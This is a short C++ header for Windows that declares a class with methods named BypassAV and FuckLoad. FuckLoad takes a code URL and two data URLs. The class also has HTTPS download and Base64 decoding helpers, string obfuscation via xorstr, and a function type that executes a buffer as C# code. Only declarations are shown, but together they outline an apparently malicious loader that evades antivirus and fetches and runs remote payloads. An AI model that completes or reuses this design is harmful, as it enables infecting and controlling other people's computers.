#pragma once
#include <iostream>

#include <windows.h>
#include <shlwapi.h>
#include <time.h>

#include "CWinHttp.h"
#include "xorstr.hpp"

#pragma comment(lib,"crypt32.lib")
#pragma comment(lib,"Shlwapi.lib")

typedef BOOL(WINAPI* ExeCSharp)(char* buffer, size_t size);

class CFuck
{
public:
	static CFuck* GetInstance();
	BOOL BypassAV();
	BOOL FuckLoad(IN LPWSTR pCodeUrl, IN LPWSTR pDataUrl1, IN LPWSTR pDataUrl2);
	std::string GetHtmlStringUseHttps(IN LPWSTR pUrl);
	std::string Base64Decode(std::string const& str);
private:
	CFuck();
	virtual ~CFuck();
	static CFuck* m_Instance;
};

